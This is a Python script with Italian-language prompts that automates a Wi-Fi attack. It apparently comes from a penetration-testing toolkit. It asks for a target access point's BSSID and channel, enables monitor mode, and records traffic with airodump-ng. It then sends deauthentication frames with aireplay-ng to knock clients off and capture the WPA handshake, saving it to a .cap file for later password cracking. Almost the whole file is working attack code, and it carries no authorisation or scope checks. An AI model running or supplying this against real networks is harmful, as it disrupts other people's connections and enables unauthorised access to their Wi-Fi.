#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Capture WPA handshake using airodump-ng and aireplay-ng.
Saves .cap file and logs details.
"""

import os
import subprocess
import time
from datetime import datetime

LOG_FILE = "wifi_pen.log"

def log_message(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

def main():
    log_message("=== HANDSHAKE CAPTURE START ===")
    print("\n⚠️  Richiede modalità monitor e target.\n")
    bssid = input("Inserisci BSSID dell'AP target: ").strip()
    channel = input("Inserisci canale (es. 6): ").strip()
    if not bssid or not channel:
        print("Dati mancanti.")
        return

    if not (os.system("which airodump-ng > /dev/null 2>&1") == 0 and
            os.system("which aireplay-ng > /dev/null 2>&1") == 0):
        print("airodump-ng o aireplay-ng non trovati. Installa aircrack-ng.")
        log_message("Tools not found")
        return

    # Attiva monitor mode
    subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
    time.sleep(2)
    interface = "wlan0mon"

    # Avvia airodump per catturare handshake
    cap_file = "handshake_capture"
    airodump_cmd = ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", cap_file, interface]
    log_message(f"Starting airodump: {' '.join(airodump_cmd)}")
    proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Esegui deauth per forzare la riconnessione
    print("Invio pacchetti deauth per forzare handshake...")
    deauth_cmd = ["aireplay-ng", "-0", "5", "-a", bssid, interface]
    subprocess.run(deauth_cmd, capture_output=True)

    print("Attesa 10 secondi per catturare handshake...")
    time.sleep(10)
    proc.terminate()
    proc.wait()

    # Verifica se il file .cap contiene handshake (semplice controllo)
    cap_path = f"{cap_file}-01.cap"
    if os.path.exists(cap_path):
        log_message(f"Handshake capture saved to {cap_path}")
        print(f"\nHandshake catturato? Verifica il file {cap_path}")
    else:
        log_message("No capture file generated")
        print("Nessun handshake catturato.")

    subprocess.run(["airmon-ng", "stop", interface], capture_output=True)
    log_message("=== HANDSHAKE CAPTURE END ===")
    print("\nPremi ENTER per tornare al menu.")
    input()

if __name__ == "__main__":
    main()